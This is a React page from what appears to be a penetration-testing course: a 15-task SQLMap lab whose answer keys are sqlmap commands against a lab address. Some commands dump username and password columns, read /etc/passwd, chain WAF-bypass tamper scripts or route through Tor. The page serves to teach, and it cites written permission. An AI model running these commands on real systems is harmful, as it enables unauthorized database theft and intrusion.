'use client'
import { useEffect } from 'react';
import DocHeading from '@/components/base/DocHeading';
import LabExercise from '@/components/base/LabExercise';
import { motion } from 'framer-motion';

const fadeUp = {
  hidden: { opacity: 0, y: 24 },
  visible: { opacity: 1, y: 0 },
};

const sqlmapLabTasks = [
  {
    id: 1,
    title: 'Basic GET parameter test',
    description: 'Test http://10.0.0.1/page?id=1 for SQL injection. Write the exact command.',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1',
    hint: 'Use -u for the target URL with the injectable parameter.',
  },
  {
    id: 2,
    title: 'Test POST data injection',
    description: 'Test POST data on http://10.0.0.1/login with username=admin&password=pass',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/login --data=username=admin&password=pass',
    hint: 'Use --data to specify POST parameters.',
  },
  {
    id: 3,
    title: 'Load request from file',
    description: 'Test an HTTP request exported from Burp Suite called request.txt',
    expectedAnswer: 'sqlmap -r request.txt',
    hint: 'Use -r to load requests from a file.',
  },
  {
    id: 4,
    title: 'Enumerate databases',
    description: 'List all databases on http://10.0.0.1/page?id=1',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1 --dbs',
    hint: 'Use --dbs to enumerate databases.',
  },
  {
    id: 5,
    title: 'Enumerate tables',
    description: 'List tables in the "webapp" database on http://10.0.0.1/page?id=1',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1 -D webapp --tables',
    hint: 'Use -D for database name and --tables for enumeration.',
  },
  {
    id: 6,
    title: 'Dump users table',
    description: 'Dump all data from the users table in webapp database',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1 -D webapp -T users --dump',
    hint: 'Specify database with -D, table with -T, and use --dump.',
  },
  {
    id: 7,
    title: 'Dump specific columns',
    description: 'Dump only the username and password columns from the users table',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1 -D webapp -T users -C username,password --dump',
    hint: 'Use -C to specify column names.',
  },
  {
    id: 8,
    title: 'Use tamper script',
    description: 'Test http://10.0.0.1/page?id=1 with the space2comment tamper script',
    expectedAnswer: "sqlmap -u 'http://10.0.0.1/page?id=1' --tamper=space2comment",
    hint: 'Use --tamper=scriptname to apply WAF bypass.',
  },
  {
    id: 9,
    title: 'Chain tamper scripts',
    description: 'Apply both space2comment and randomcase tamper scripts together',
    expectedAnswer: "sqlmap -u 'http://10.0.0.1/page?id=1' --tamper=space2comment,randomcase",
    hint: 'Separate multiple tamper scripts with commas.',
  },
  {
    id: 10,
    title: 'Increase test level',
    description: 'Run SQLMap with level 5 and risk 3 on http://10.0.0.1/page?id=1',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1 --level=5 --risk=3',
    hint: 'Use --level and --risk flags with values 1-5 and 1-3 respectively.',
  },
  {
    id: 11,
    title: 'Use batch mode',
    description: 'Run non-interactively, accepting all defaults on http://10.0.0.1/page?id=1',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1 --batch',
    hint: 'Use --batch to run without user prompts.',
  },
  {
    id: 12,
    title: 'Read server file',
    description: 'Read /etc/passwd from http://10.0.0.1/page?id=1',
    expectedAnswer: "sqlmap -u 'http://10.0.0.1/page?id=1' --file-read=/etc/passwd",
    hint: 'Use --file-read with the file path.',
  },
  {
    id: 13,
    title: 'Specify injection technique',
    description: 'Test only UNION-based and Boolean-based techniques on http://10.0.0.1/page?id=1',
    expectedAnswer: "sqlmap -u 'http://10.0.0.1/page?id=1' --technique=BU",
    hint: 'Use --technique with the technique codes (B, E, U, S, T, Q).',
  },
  {
    id: 14,
    title: 'Test specific parameter',
    description: 'Test only the "id" parameter on http://10.0.0.1/search?q=test&id=1',
    expectedAnswer: "sqlmap -u 'http://10.0.0.1/search?q=test&id=1' -p id",
    hint: 'Use -p to specify which parameter to test.',
  },
  {
    id: 15,
    title: 'Use Tor for anonymity',
    description: 'Run SQLMap through Tor on http://10.0.0.1/page?id=1',
    expectedAnswer: 'sqlmap -u http://10.0.0.1/page?id=1 --tor --batch',
    hint: 'Add --tor flag and consider --batch for non-interactive mode.',
  },
];

export default function SQLMapLabPage() {
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <div className="px-6 md:px-12 lg:px-16 py-10 max-w-5xl">
      <motion.div initial="hidden" animate="visible" variants={fadeUp} transition={{ duration: 0.5 }}>
        <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-cyber-red/10 border border-cyber-red/20 text-cyber-red text-xs font-medium font-mono mb-4">
          <i className="ri-flask-line" />
          SQLMap Section 13 of 13
        </div>
        <DocHeading level={1}>SQLMap Lab</DocHeading>
        <p className="text-cyber-text leading-relaxed mt-3 text-lg">
          Apply everything you learned. Type the exact SQLMap command for each of these 15 scenarios. Use hints if you get stuck, but try to solve each task from memory first.
        </p>
      </motion.div>

      <motion.section className="mt-8" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <LabExercise title="SQLMap Hands-On Lab" tasks={sqlmapLabTasks} />
      </motion.section>

      <motion.section className="mt-8 mb-16" initial="hidden" whileInView="visible" viewport={{ once: true }} variants={fadeUp}>
        <div className="cyber-card p-5">
          <h3 className="text-sm font-semibold text-white mb-2">How to Practice for Real</h3>
          <p className="text-xs text-cyber-text leading-relaxed">
            These exercises test your command syntax knowledge. For hands-on practice with real targets, set up DVWA, Metasploitable, or a local vulnerable web application. Always use written permission.
          </p>
        </div>
        <div className="mt-6 flex gap-3">
          <a href="/sqlmap" className="px-5 py-2.5 rounded-lg bg-cyber-amber text-black text-sm font-semibold hover:bg-cyber-amber/80 transition-all whitespace-nowrap">
            <i className="ri-home-line mr-1" /> Back to SQLMap Module
          </a>
        </div>
      </motion.section>
    </div>
  );
}